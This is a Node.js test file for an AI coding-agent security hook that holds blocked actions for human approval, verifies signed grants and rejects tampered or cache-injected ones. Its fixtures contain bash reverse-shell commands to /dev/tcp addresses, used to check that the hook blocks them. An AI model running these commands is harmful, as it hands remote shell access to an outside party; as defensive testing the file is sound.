// F14 just-in-time approval routing, device side, end to end against a fake console (CONTRACT-F28 §3):
// the signed policy carries approvalRouting; a routable block is held (denied at once) and one content-free
// APPROVAL_REQUESTED alert is posted; the decision returns in the signed `approvals` list of a later /api/policy
// response; the identical action is then allowed once (or until validUntil), a different action is not; an unsigned
// or tampered approvals list is ignored; a request past its expiry is denied and APPROVAL_EXPIRED posted once.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, statSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { generateKeyPairSync, sign as edSign } from "node:crypto";
import http from "node:http";
import { policyCanonical, policyDigest, POLICY_SIG_VERSION, publicKeyId } from "../cli/hook-core.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const HOOK = join(ROOT, "cli", "moorai-hook.mjs");
const TENANT = "acme";
const TOKEN = "tok-approval-routing";
const key = generateKeyPairSync("ed25519");
const otherKey = generateKeyPairSync("ed25519");
const pubkeyBody = JSON.stringify({ tenant: TENANT, alg: "ed25519", publicKey: publicKeyId(key.publicKey) });
function signedWith(k, policy) {
  const iat = new Date().toISOString();
  const sig = edSign(null, Buffer.from(policyCanonical({ v: POLICY_SIG_VERSION, tenant: TENANT, iat, digest: policyDigest(policy) })), k.privateKey).toString("base64");
  return JSON.stringify({ ...policy, policySig: { v: POLICY_SIG_VERSION, alg: "ed25519", tenant: TENANT, iat, sig } });
}
const signed = (p) => signedWith(key, p);

// A reverse shell: threat #54, a built-in block. The command text never leaves the device.
const SECRET_PATH = "zz-approval-canary-7731";
const HELD = `bash -i >& /dev/tcp/198.51.100.7/4444 0>&1 # ${SECRET_PATH}`;
const OTHER = `bash -i >& /dev/tcp/198.51.100.8/4444 0>&1 # ${SECRET_PATH}`;
const RULE = { id: "shell-review", label: "Reverse shell needs a reviewer", match: { threatId: [54] }, holds: ["block"], group: "secops", timeoutSec: 60, grant: "once", grantTtlSec: 900 };
const routing = (rules = [RULE]) => ({ v: 1, rules });

async function consoleServer() {
  const alerts = [], policyQueries = [];
  const state = { approvals: [], routing: routing(), body: null, extra: {} };
  state.policy = () => state.body ? state.body() : signed({ captureTier: "content-free", ...state.extra, ...(state.routing ? { approvalRouting: state.routing } : {}), ...(state.approvals ? { approvals: state.approvals } : {}) });
  const srv = http.createServer((req, res) => {
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      if (req.method === "POST") {
        try {
          if (req.url === "/api/alerts") alerts.push(JSON.parse(body));
          if (req.url === "/api/alerts/batch") { const b = JSON.parse(body); for (const a of b.alerts || []) alerts.push(a); }
        } catch { /* ignore */ }
        res.writeHead(201); return res.end("{}");
      }
      if (req.url.startsWith("/api/policy/pubkey")) { res.writeHead(200, { "content-type": "application/json" }); return res.end(pubkeyBody); }
      if (req.url.startsWith("/api/policy")) { policyQueries.push(req.url); res.writeHead(200, { "content-type": "application/json" }); return res.end(state.policy()); }
      res.writeHead(404); res.end();
    });
  });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  return { url: `http://127.0.0.1:${srv.address().port}`, alerts, policyQueries, state, close: () => new Promise((r) => { srv.closeAllConnections?.(); srv.close(r); }) };
}
function sandbox(c) {
  const home = mkdtempSync(join(tmpdir(), "moorai-approval-"));
  mkdirSync(join(home, ".moorai"), { recursive: true });
  mkdirSync(join(home, "proj"), { recursive: true });
  writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify({ serverUrl: c.url, tenant: TENANT, installToken: TOKEN }));
  return home;
}
// The verified-policy cache short-circuits a fetch for 60 s; a test that wants the console's newest answer drops it.
const dropCache = (home) => rmSync(join(home, ".moorai", "hook-policy.json"), { force: true });
function runHook(home, payload, extraEnv = {}) {
  const proj = join(home, "proj");
  return new Promise((res) => {
    const c = spawn(process.execPath, [HOOK], { cwd: proj, env: { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home, CLAUDE_PROJECT_DIR: proj, ...extraEnv } });
    let out = "", err = "";
    c.stdout.on("data", (d) => (out += d)); c.stderr.on("data", (d) => (err += d));
    c.on("close", (status) => res({ status, out, err }));
    c.stdin.end(JSON.stringify({ session_id: "sess-approval", cwd: proj, ...payload }));
  });
}
const bash = (command) => ({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command } });
const decision = (r) => { try { return JSON.parse(r.out).hookSpecificOutput?.permissionDecision || "allow"; } catch { return r.out.trim() ? "?" : "allow"; } };
const reasonOf = (r) => { try { return JSON.parse(r.out).hookSpecificOutput?.permissionDecisionReason || ""; } catch { return ""; } };
const byCode = (c, code) => c.alerts.filter((a) => a.reasonCode === code);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function until(fn, ms = 10000) { const end = Date.now() + ms; while (Date.now() < end) { if (fn()) return true; await sleep(50); } return fn(); }
const stateFile = (home) => join(home, ".moorai", "approvals.json");
const approvalState = (home) => JSON.parse(readFileSync(stateFile(home), "utf8"));
// Pin the device to the console's key (first contact), with no routing involved yet.
async function pin(home) { const r = await runHook(home, bash("echo pin")); assert.equal(r.status, 0, r.err); dropCache(home); }
function grantFor(req, { decision: d = "approve", grant = "once", validMs = 900000 } = {}) {
  return { requestId: req.approval.requestId, ruleId: req.approval.ruleId, actionHash: req.approval.actionHash, decision: d, grant, decidedAt: new Date().toISOString(), validUntil: new Date(Date.now() + validMs).toISOString() };
}
async function heldOnce(c, home) {
  await pin(home);
  const r = await runHook(home, bash(HELD));
  assert.equal(r.status, 0, r.err);
  assert.equal(decision(r), "deny", r.out);
  assert.ok(await until(() => byCode(c, "APPROVAL_REQUESTED").length === 1), `one request posted: ${JSON.stringify(c.alerts.map((a) => a.reasonCode))}`);
  return { r, req: byCode(c, "APPROVAL_REQUESTED")[0] };
}

test("held: a routable block is denied at once with the held reason and one content-free APPROVAL_REQUESTED alert", async () => {
  const c = await consoleServer();
  const home = sandbox(c);
  try {
    const { r, req } = await heldOnce(c, home);
    assert.match(reasonOf(r), /Held for approval: Reverse shell needs a reviewer \(request apr_[0-9A-HJKMNP-TV-Z]{26}\)\. Retry after it is approved\./);
    assert.equal(req.category, "Approval requested");
    assert.equal(req.riskLevel, "High");
    assert.equal(req.decision, "deny");
    assert.equal(req.stage, "PreToolUse");
    assert.equal(req.threatId, 54);
    assert.equal(req.agentName, "claude-code");
    const a = req.approval;
    assert.deepEqual(Object.keys(a).sort(), ["actionHash", "expiresAt", "requestId", "requestedAt", "ruleId", "surface", "v", "verdict"]);
    assert.equal(a.v, 1);
    assert.match(a.requestId, /^apr_[0-9A-HJKMNP-TV-Z]{26}$/);
    assert.ok(reasonOf(r).includes(a.requestId), "the agent is told the same request id");
    assert.equal(a.ruleId, "shell-review");
    assert.equal(a.surface, "hook");
    assert.equal(a.verdict, "block");
    assert.match(a.actionHash, /^h2:[0-9a-f]{16}$/);
    assert.equal(Date.parse(a.expiresAt) - Date.parse(a.requestedAt), 60000, "expires after the rule's timeoutSec");
    // Content-free: nothing of the command reaches the console.
    for (const x of c.alerts) { const s = JSON.stringify(x); assert.ok(!s.includes(SECRET_PATH) && !s.includes("198.51.100") && !s.includes("/dev/tcp"), `content-free: ${s}`); }
    // The policy fetch names the device's keyed actor so the console can scope the approvals list (no hostname).
    assert.ok(c.policyQueries.some((q) => /[?&]actor=h2%3A[0-9a-f]{16}(&|$)/.test(q)), `actor in the policy query: ${c.policyQueries}`);
    assert.ok(c.policyQueries.every((q) => !/[?&](device|user)=/.test(q)), "no hostname or login in the query");
    // Pending state on disk, 0600.
    const st = approvalState(home);
    assert.equal(st.pending.length, 1);
    assert.equal(st.pending[0].requestId, a.requestId);
    if (process.platform !== "win32") assert.equal(statSync(stateFile(home)).mode & 0o777, 0o600);
  } finally { await c.close(); rmTree(home); }
});

test("dedupe: the same held action while the request is pending reuses it and sends no second alert", async () => {
  const c = await consoleServer();
  const home = sandbox(c);
  try {
    const { req } = await heldOnce(c, home);
    dropCache(home);
    const r2 = await runHook(home, bash(HELD));
    assert.equal(decision(r2), "deny");
    assert.ok(reasonOf(r2).includes(req.approval.requestId), "same request id");
    await sleep(500);
    assert.equal(byCode(c, "APPROVAL_REQUESTED").length, 1, "no second request");
  } finally { await c.close(); rmTree(home); }
});

test("grant once: after the signed approval the identical action is allowed once, a different action is not", async () => {
  const c = await consoleServer();
  const home = sandbox(c);
  try {
    const { req } = await heldOnce(c, home);
    c.state.approvals = [grantFor(req)];
    dropCache(home);
    // A different action under the same rule is not covered by the grant: held as its own request.
    const other = await runHook(home, bash(OTHER));
    assert.equal(decision(other), "deny", other.out);
    assert.ok(await until(() => byCode(c, "APPROVAL_REQUESTED").length === 2), "the different action raises its own request");
    assert.notEqual(byCode(c, "APPROVAL_REQUESTED")[1].approval.actionHash, req.approval.actionHash);
    const ok = await runHook(home, bash(HELD));
    assert.equal(ok.status, 0, ok.err);
    assert.equal(decision(ok), "allow", `identical action allowed: ${ok.out}`);
    assert.ok(await until(() => byCode(c, "APPROVAL_USED").length === 1), "APPROVAL_USED posted");
    const used = byCode(c, "APPROVAL_USED")[0];
    assert.equal(used.approval.requestId, req.approval.requestId);
    assert.equal(used.riskLevel, "Info");
    assert.equal(used.decision, "allow");
    assert.ok(approvalState(home).used.some((u) => u.requestId === req.approval.requestId), "recorded as used");
    // Once: the next identical call is held again (a new request), though the grant is still served.
    const again = await runHook(home, bash(HELD));
    assert.equal(decision(again), "deny", again.out);
    assert.ok(await until(() => byCode(c, "APPROVAL_REQUESTED").length === 3), "a new request after the once grant was used");
    assert.notEqual(byCode(c, "APPROVAL_REQUESTED")[2].approval.requestId, req.approval.requestId);
    assert.equal(byCode(c, "APPROVAL_USED").length, 1);
  } finally { await c.close(); rmTree(home); }
});

test("grant ttl: the identical action is allowed on every call until validUntil, then held again", async () => {
  const c = await consoleServer();
  c.state.routing = routing([{ ...RULE, grant: "ttl", grantTtlSec: 60 }]);
  const home = sandbox(c);
  try {
    const { req } = await heldOnce(c, home);
    c.state.approvals = [grantFor(req, { grant: "ttl", validMs: 2500 })];
    dropCache(home);
    assert.equal(decision(await runHook(home, bash(HELD))), "allow");
    assert.equal(decision(await runHook(home, bash(HELD))), "allow");
    await until(() => byCode(c, "APPROVAL_USED").length >= 1);
    await sleep(300);
    assert.equal(byCode(c, "APPROVAL_USED").length, 1, "USED once per grant");
    await sleep(2600);
    const after = await runHook(home, bash(HELD));
    assert.equal(decision(after), "deny", `past validUntil the grant is not honoured: ${after.out}`);
  } finally { await c.close(); rmTree(home); }
});

test("deny grant: the identical action is answered 'Denied by approver'", async () => {
  const c = await consoleServer();
  const home = sandbox(c);
  try {
    const { req } = await heldOnce(c, home);
    c.state.approvals = [grantFor(req, { decision: "deny" })];
    dropCache(home);
    const r = await runHook(home, bash(HELD));
    assert.equal(decision(r), "deny");
    assert.match(reasonOf(r), /Denied by approver \(Reverse shell needs a reviewer/);
    await sleep(400);
    assert.equal(byCode(c, "APPROVAL_REQUESTED").length, 1, "no new request while the denial is served");
  } finally { await c.close(); rmTree(home); }
});

test("unsigned approvals: a policy body with a grant but no signature is ignored on a pinned device", async () => {
  const c = await consoleServer();
  const home = sandbox(c);
  try {
    const { req } = await heldOnce(c, home);
    c.state.body = () => JSON.stringify({ captureTier: "content-free", approvalRouting: routing(), approvals: [grantFor(req)] });
    dropCache(home);
    const r = await runHook(home, bash(HELD));
    assert.equal(decision(r), "deny", r.out);
    assert.equal(byCode(c, "APPROVAL_USED").length, 0);
  } finally { await c.close(); rmTree(home); }
});

test("tampered approvals: a grant added to a signed body after signing (or signed by another key) is ignored", async () => {
  const c = await consoleServer();
  const home = sandbox(c);
  try {
    const { req } = await heldOnce(c, home);
    // Signed without the grant, then the grant spliced in: the digest no longer matches.
    c.state.body = () => { const p = JSON.parse(signed({ captureTier: "content-free", approvalRouting: routing() })); p.approvals = [grantFor(req)]; return JSON.stringify(p); };
    dropCache(home);
    assert.equal(decision(await runHook(home, bash(HELD))), "deny");
    // Signed with a key the device never pinned.
    c.state.body = () => signedWith(otherKey, { captureTier: "content-free", approvalRouting: routing(), approvals: [grantFor(req)] });
    dropCache(home);
    assert.equal(decision(await runHook(home, bash(HELD))), "deny");
    // The cache file is in the agent's write scope: a grant written into it is not signed either.
    c.state.body = null;
    const cache = join(home, ".moorai", "hook-policy.json");
    const p = JSON.parse(signed({ captureTier: "content-free", approvalRouting: routing() }));
    p.approvals = [grantFor(req)];
    writeFileSync(cache, JSON.stringify(p));
    assert.equal(decision(await runHook(home, bash(HELD))), "deny");
    await sleep(300);
    assert.equal(byCode(c, "APPROVAL_USED").length, 0);
  } finally { await c.close(); rmTree(home); }
});

test("unanchored: on a device with no key yet a signed-looking grant is not honoured", async () => {
  const c = await consoleServer();
  const home = sandbox(c);
  try {
    // An earlier request id, approved, served on the very first contact (the device holds no pin or anchor yet).
    const fake = { reasonCode: "APPROVAL_REQUESTED", approval: { requestId: "apr_0000000000000000000000000A", ruleId: "shell-review", actionHash: "h2:0000000000000000" } };
    // Learn the actionHash the device computes, then serve a grant for it on a fresh, never-pinned device.
    await heldOnce(c, home);
    const real = byCode(c, "APPROVAL_REQUESTED")[0];
    const home2 = sandbox(c);
    try {
      c.state.approvals = [grantFor({ ...fake, approval: { ...fake.approval, actionHash: real.approval.actionHash } }), grantFor(real)];
      const r = await runHook(home2, bash(HELD));
      assert.equal(decision(r), "deny", `first contact: no grant honoured: ${r.out}`);
    } finally { rmTree(home2); }
  } finally { await c.close(); rmTree(home); }
});

test("expiry: a request past expiresAt with no decision is denied and APPROVAL_EXPIRED is posted once", async () => {
  const c = await consoleServer();
  const home = sandbox(c);
  try {
    const { req } = await heldOnce(c, home);
    // Age the pending record past its expiry (the rule's minimum timeout is 60 s).
    const st = approvalState(home);
    st.pending[0].requestedAt = new Date(Date.now() - 120000).toISOString();
    st.pending[0].expiresAt = new Date(Date.now() - 60000).toISOString();
    writeFileSync(stateFile(home), JSON.stringify(st));
    dropCache(home);
    const r = await runHook(home, bash(HELD));
    assert.equal(decision(r), "deny");
    assert.ok(await until(() => byCode(c, "APPROVAL_EXPIRED").length === 1), "APPROVAL_EXPIRED posted");
    assert.equal(byCode(c, "APPROVAL_EXPIRED")[0].approval.requestId, req.approval.requestId);
    // The next identical call raised a new request in the same call; a further call reuses it and expires nothing.
    assert.ok(await until(() => byCode(c, "APPROVAL_REQUESTED").length === 2));
    dropCache(home);
    assert.equal(decision(await runHook(home, bash(HELD))), "deny");
    await sleep(400);
    assert.equal(byCode(c, "APPROVAL_EXPIRED").length, 1, "expired once");
    assert.equal(byCode(c, "APPROVAL_REQUESTED").length, 2);
    // An approval that arrives for the expired request is still honoured while its validUntil holds.
    c.state.approvals = [grantFor(req)];
    dropCache(home);
    assert.equal(decision(await runHook(home, bash(HELD))), "allow");
  } finally { await c.close(); rmTree(home); }
});

test("back-compat: no approvalRouting in the policy leaves the block a plain block with no request", async () => {
  const c = await consoleServer();
  c.state.routing = null;
  const home = sandbox(c);
  try {
    await pin(home);
    const r = await runHook(home, bash(HELD));
    assert.equal(decision(r), "deny");
    assert.ok(!/Held for approval/.test(reasonOf(r)), reasonOf(r));
    await sleep(400);
    assert.equal(byCode(c, "APPROVAL_REQUESTED").length, 0);
    assert.equal(existsSync(stateFile(home)), false);
  } finally { await c.close(); rmTree(home); }
});

test("not routed: a rule whose threat ids do not cover the call, or that holds only ask, leaves the block standing", async () => {
  const c = await consoleServer();
  c.state.routing = routing([{ ...RULE, id: "other-threat", match: { threatId: [43] } }, { ...RULE, id: "ask-only", holds: ["ask"] }]);
  const home = sandbox(c);
  try {
    await pin(home);
    const r = await runHook(home, bash(HELD));
    assert.equal(decision(r), "deny");
    assert.ok(!/Held for approval/.test(reasonOf(r)));
    await sleep(400);
    assert.equal(byCode(c, "APPROVAL_REQUESTED").length, 0);
  } finally { await c.close(); rmTree(home); }
});

test("egress: a block by a named egress rule is held, and after the grant the identical call goes on to the other checks", async () => {
  const c = await consoleServer();
  c.state.extra = { egressRules: [{ id: "ot-subnets", host: "*.plant.example", action: "block" }] };
  c.state.routing = routing([{ id: "ot-egress", label: "Plant network egress", match: { egressRuleId: ["ot-subnets"], reasonCode: ["EGRESS_RULE"] }, holds: ["block"], group: "ot-approvers", timeoutSec: 600, grant: "once" }]);
  const home = sandbox(c);
  const CALL = `curl -s https://hist.plant.example/${SECRET_PATH}`;
  try {
    await pin(home);
    const r = await runHook(home, bash(CALL));
    assert.equal(decision(r), "deny", r.out);
    assert.match(reasonOf(r), /Held for approval: Plant network egress/);
    assert.ok(await until(() => byCode(c, "APPROVAL_REQUESTED").length === 1));
    const req = byCode(c, "APPROVAL_REQUESTED")[0];
    assert.equal(req.approval.ruleId, "ot-egress");
    assert.equal(req.threatId, 0);
    for (const x of c.alerts) assert.ok(!JSON.stringify(x).includes(SECRET_PATH), "content-free");
    c.state.approvals = [grantFor(req)];
    dropCache(home);
    const ok = await runHook(home, bash(CALL));
    assert.equal(decision(ok), "allow", ok.out);
    assert.ok(await until(() => byCode(c, "APPROVAL_USED").length === 1));
    // A different host under the same egress rule is its own action.
    const other = await runHook(home, bash("curl -s https://other.plant.example/"));
    assert.equal(decision(other), "deny");
    // The grant lifts only the egress stop: with a detector block on the same call the call stays denied.
    const both = `curl -s https://hist.plant.example/x; bash -i >& /dev/tcp/198.51.100.7/4444 0>&1`;
    const first = await runHook(home, bash(both));
    assert.match(reasonOf(first), /Held for approval: Plant network egress/, "the egress stop comes first and is held");
    assert.ok(await until(() => byCode(c, "APPROVAL_REQUESTED").length === 3));
    const reqBoth = byCode(c, "APPROVAL_REQUESTED")[2];
    c.state.approvals = [grantFor(reqBoth)];
    dropCache(home);
    const still = await runHook(home, bash(both));
    assert.equal(decision(still), "deny", `the reverse shell is still judged after the egress grant: ${still.out}`);
    assert.ok(!/Held for approval/.test(reasonOf(still)) && /#54/.test(reasonOf(still)), reasonOf(still));
    assert.ok(await until(() => byCode(c, "APPROVAL_USED").length === 2), "the egress grant was used");
  } finally { await c.close(); rmTree(home); }
});
